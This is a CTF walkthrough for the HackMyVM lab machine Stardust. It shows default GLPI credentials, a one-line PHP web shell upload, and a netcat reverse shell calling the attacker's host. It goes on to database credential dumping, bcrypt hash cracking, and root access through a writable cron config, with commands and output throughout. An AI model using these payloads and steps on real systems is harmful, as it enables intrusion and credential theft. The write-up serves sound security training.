---
title: CTF Walkthrough for HackMyVM Machine Stardust
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, ]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/box-stardust.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Stardust a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Stardust<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Stardust](https://downloads.hackmyvm.eu/stardust.zip)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Netcat<br>
4) Zaproxy<br>
5) John

## Reconnaissance

This machine displays its IP address on startup. We can use its address to enumerate services running on open ports using Nmap.
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 13:12 BST
Nmap scan report for 10.0.2.23
Host is up (0.00059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Authentication - GLPI
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```

Our target appears to run an SSH server and an Apache2 web server. Let's visit the web application to understand its function.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/1-browse.png)

Our target runs GLPI a web-based application helping companies to manage their information system.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/glpi-description.png)

Our first approach when we encounter a web-based application is to look for default credentials. This is because administrators often forget to delete these accounts when setting up the environment.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/glpi-default-cred.png)

In our case glpi:glpi works and we can log in as the super admin user.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/glpi-login.png){: .center}
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/glpi-admin-interface.png)

## Exploitation

By clicking everywhere we will discover the Documents section under the Management tab where we can upload files. Unfortunately, this doesn't allow us to upload PHP scripts. Remember that we logged in as the super admin user so the may be a way to change this. By doing a Google search on how to do this, we will discover that this can be done in the Dropdowns section under the Setup tab. We can now add the PHP extension to the PHP file upload.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/extensions-added.png)

Now that we have added the PHP extension as an authorised extension we can go back to the document section and upload our PHP web shell.
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/shell-upload.png)

We can successfully upload the file but we do not know where this file is stored on the server. We can do a Google search to find where this file was uploaded to.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/google-search.png)

The file appears to be stored in the files directory. If we browse to the PHP directory under that directory we shall see our PHP file.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/find-file-1.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/find-file-2.png)

The file appears to be stored in his directory with a random name and the upper case PHP extension. This extension prevents the execution of the file by the web server. We can confirm that this is our file by reading its content.
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$curl http://10.0.2.23/files/PHP/f1/6d1122d450c92e85174c1984c70c2d6e4bdeb3.PHP
<?php system($_GET["cmd"]); ?>
```

If we take a look at the requests made we will notice that three POST requests were made one of which uploaded the file.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/three-requests.png)

When we take a look at the POST request made to the fileupload.php file responsible for uploading our shell we will notice that JSON data is returned to us. This data appears to contain a URL to access and delete the temporary file created on the server.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/raw-req-res.png)
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$ echo '
{"_uploader_filename":[{"name":"622913c0af135c.84173822webshell.php","size":31,"type":"application\/x-php","url":"http:\/\/10.0.2.23\/ajax\/files\/622913c0afteUrl":"http:\/\/10.0.2.23\/ajax\/fileupload.php?_uploader_filenam=622913c0af135c.84173822webshell.php","deleteType":"DELETE","prefix":"622913c0af135c.841738","filesize":"31 o","id":"doc_uploader_filename1029752998"}]}' | jq .
{
  "_uploader_filename": [
    {
      "name": "622913c0af135c.84173822webshell.php",
      "size": 31,
      "type": "application/x-php",
      "url": "http://10.0.2.23/ajax/files/622913c0af135c.84173822webshell.php",
      "deleteUrl": "http://10.0.2.23/ajax/fileupload.php?_uploader_filenam=622913c0af135c.84173822webshell.php",
      "deleteType": "DELETE",
      "prefix": "622913c0af135c.84173822",
      "display": "webshell.php 31 o",
      "filesize": "31 o",
      "id": "doc_uploader_filename1029752998"
    }
  ]
}
```

If we send this request for a second time and attempt to access it from the /ajax/files parent directory, we will notice that the files child directory doesn't exist under the ajax parent directory. This means this temporary file must be in another directory on the server before it is been transferred to the /files/PHP directory.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/ajax-files-dir-404.png)

If we look in all the folders under the /files directory we will see that the file is stored under the /files/_tmp directory.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-21-stardust/uploaded-file.png)

We see that the file is stored with the lowercase PHP extension. We can test this web shell with a simple command like id.
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$curl http://10.0.2.23/files/_tmp/6229105448218c.17957784webshell.php?cmd=id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now that we have RCE on the target we can leverage this to obtain a reverse shell.
##### We start our listener
```bash
┌──(pentester㉿kali)-[~/Stardust/]
└─$nc -lvnp 1234
listening on [any] 1234 ...
```
##### We send the reverse shell payload
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$curl http://10.0.2.23/files/_tmp/6229105448218c.17957784webshell.php?cmd=nc+-c+bash+10.0.2.16+1234
```
##### We upgrade the shell to a fully interactive shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
www-data@stardust:/var/www/html/files/_tmp$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(whitemiller㉿kali)-[~/Stardust]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@stardust:/var/www/html$ ls /home
tally
```

Now that we have obtained a foothold on the target, we can use this to enumerate the system further. A quick look in the server's root directory reveals a configuration file that stores database credentials.
```bash
www-data@stardust:/var/www/html/config$ cat config_db.php 
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'D6jsxBGekO';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

We can use these credentials to connect to the database and enumerate it further. 
```bash
www-data@stardust:/var/www/html$ mysql -u glpi -p
Enter password: 
<SNIP>
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| glpi               |
| information_schema |
| intranetikDB       |
+--------------------+
3 rows in set (0.012 sec)

MariaDB [(none)]> use intranetikDB
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [intranetikDB]> show tables;
+------------------------+
| Tables_in_intranetikDB |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.000 sec)

MariaDB [intranetikDB]> Describe users;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int(11)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(255) | NO   |     | NULL    |                |
| password | varchar(255) | NO   |     | NULL    |                |
+----------+--------------+------+-----+---------+----------------+
3 rows in set (0.001 sec)

MariaDB [intranetikDB]> select * from users;
+----+-----------+--------------------------------------------------------------+
| id | username  | password                                                     |
+----+-----------+--------------------------------------------------------------+
|  1 | carolynn  | $2b$12$HRVJrlSG5eSW44VaNlTwoOwu42c1l9AnbpOhDvcEXVMyhcB46ZtXC |
|  2 | chi-yin   | $2b$12$.sDM7vxQCe3nmOois5Ho4O1HkNEiz4UJ/9XEsYlnbH7Awlxfig3g2 |
|  3 | tally     | $2b$12$zzVJxxxxxxxxxxxxxxxxxxxxxxxxxxpbeKKbP21cn7FKtNy4Ycjl. |
<SNIP>
| 15 | brittany  | $2b$12$hgjI3XifZTqfMCSM4TOqTObHNLNvkT0FhwiAJ7zr/GGLM58b4ieVC |
+----+-----------+--------------------------------------------------------------+
15 rows in set (0.001 sec)
```

The database appears to store the password of Tally who is also a local user on the system. Let's copy this password and attempt to crack it using the rockyou.txt wordlist.
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$ echo '$2b$12$zzVJjW1Bvm4WqcPy6nqDFOU4JRh2mMpbeKKbP21cn7FKtNy4Ycjl.' > john-hash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$ john john-hash -wordlist=.rockyou.txt 
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
<SNIP>
<REDACTED>           (?)     
1g 0:00:00:04 DONE (2024-09-20 21:52) 0.2012g/s 57.95p/s 57.95c/s 57.95C/s hellokitty..brenda
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We can see that we successfully cracked the hash. We can use this password to log in as the tally user and read the flag.
```bash
www-data@stardust:/var/www/html$ su tally
Password: 
tally@stardust:/var/www/html$ ls /home/tally/
user.txt
```

## Post Exploitation

Now that we have compromised a normal user account let's enumerate the system to escalate our privileges. We can do this by enumerating cron jobs running on the target using pspy64. Let's transfer this binary from our attack host to the target.
##### Starting Our Python server on the attack host
```bash
┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$cp /usr/share/pspy/pspy64 .

┌──(pentester㉿kali)-[~/Stardust/Misc File]
└─$python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
###### Downloading and running pspy64 on the target
```bash
tally@stardust:/tmp$ wget 10.0.2.16:8000/pspy64
--2024-09-20 21:03:55--  http://10.0.2.16:8000/pspy64
Connecting to 10.0.2.16:8000... connected.
<SNIP>

pspy64              100%[===================>]   2.96M  --.-KB/s    in 0.03s   

2024-09-20 21:03:55 (97.3 MB/s) - ‘pspy64’ saved [3104768/3104768]

tally@stardust:/tmp$ chmod 755 pspy64 
tally@stardust:/tmp$ ./pspy64    
<SNIP>
2024/09/20 21:05:01 CMD: UID=0     PID=7310   | /usr/sbin/CRON -f 
2024/09/20 21:05:01 CMD: UID=0     PID=7311   | /bin/sh -c /opt/meteo 
<SNIP>
```

We see from the above output that the file /opt/meteo is run as root after a certain period. Let's move to that directory and understand what the file does.
```bash
tally@stardust:/tmp$ cd /opt
tally@stardust:/opt$ ls -la
<SNIP>
-rw-rw-r--+  1 root root   49 May  8  2023 config.json
-rwxr-xr-x   1 root root  607 May  7  2023 meteo

tally@stardust:/opt$ cat meteo 
#! /bin/bash

#meteo
config="/opt/config.json"
latitude=$(jq '.latitude' $config)
longitude=$(jq '.longitude' $config)
limit=1000

#sys
web="/var/www/intranetik"
users="/home/tally"
root="/root"
dest="/var/backups"

#get rain elevation 
elevation=$(curl -s "https://api.open-meteo.com/v1/forecast?latitude=$latitude&longitude=$longitude&hourly=rain" |jq .elevation)

if [[ $elevation -gt $limit ]] ; then
echo "RAIN ALERT !"
tar -cf $dest/backup.tar $web >/dev/null
tar -rf $dest/backup.tar $users >/dev/null
tar -rf $dest/backup.tar $root >/dev/null
echo "BACKUP FINISHED"
else
echo "Weather is cool !"
fi

tally@stardust:/opt$ cat config.json 
{
  "latitude":  -18.48,
  "longitude": -70.33
}
```

This file appears to collect the elevation of a specific point using its latitude and longitude collection from the config.json files. If the elevation is greater than 1000 a backup of the root directory is done. Notice that we have write privileges on the config.json file let's change these coordinates to ensure that the elevation of the area will be greater than 1000 so that the backup is performed.
```bash
tally@stardust:/opt$ curl  -s "https://api.open-meteo.com/v1/forecast?latitude=50&longitude=100&hourly=rain" | jq .elevation
1747
tally@stardust:/opt$ nano config.json 
tally@stardust:/opt$ cat config.json 
{
  "latitude":  50,
  "longitude": 100
}
```

After waiting for a certain time we will notice that the backup file has been created and that we have read access to it.
```bash
tally@stardust:/opt$ ls -l /var/backups/ 
total 1256
<SNIP>
-rw-r--r-- 1 root root 133120 Sep 20 21:59 backup.tar
-rw-r--r-- 1 root root      0 May  8  2023 dpkg.arch.0
<SNIP>
```

Let's de-archive the backup file and read important files in the root directory.
```bash
tally@stardust:/opt$ cp  /var/backups/backup.tar  /tmp
tally@stardust:/opt$ cd /tmp
tally@stardust:/tmp$ ls -la
total 176
<SNIP>
-rw-r--r--  1 tally tally 133120 Sep 20 22:01 backup.tar
<SNIP>
tally@stardust:/tmp$ tar -xf backup.tar 
tally@stardust:/tmp$ ls -la
<SNIP>
-rw-r--r--  1 tally tally 133120 Sep 20 22:01 backup.tar
drwxr-xr-x  3 tally tally   4096 Sep 20 22:02 home
-rwxr-xr-x  1 tally tally    738 Sep 20 21:57 meteo
drwx------  4 tally tally   4096 May  8  2023 root
<SNIP>
tally@stardust:/tmp$ cd root
tally@stardust:/tmp/root$ ls -l
total 4
-rwx------ 1 tally tally 33 Feb  6  2023 root.txt
```

We see that the root's home directory contained the root's flag. Also,  in a real-world assessment, we will be hunting instead for the SSH private key of the root user. This key can be found in the .ssh directory and we can use it to log in as root as shown below.

```bash
tally@stardust:/tmp/root$ cat .ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAypp9Oz2A+JVbFJjgtC+idEffahpdhumGR9jkHmhMffGCerTmXnuz
<SNIP>
tFsU7qe68sL5VnMWNiCVgHQ4FKqYBxzDRloZ4OJ1KXSiOClXy5N3FFHovcTewhxwJ1YoMa
14kVDKwVmq19UAAAARcm9vdEBzdGFyZHVzdC5obXYBAg==
-----END OPENSSH PRIVATE KEY-----

tally@stardust:/tmp$ ssh root@127.0.0.1 -i root/.ssh/id_rsa 
Linux stardust.hmv 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

<SNIP>
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 20 22:37:24 2024 from 127.0.0.1
root@stardust:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion
Congratulations! In this walkthrough, you have exploited default credentials on a web-based application to obtain a foothold on the target. This machine was designed to show how the usage of default credentials on web-based applications could seriously impact the security posture of an organisation. Thank you for following up on this walkthrough. 
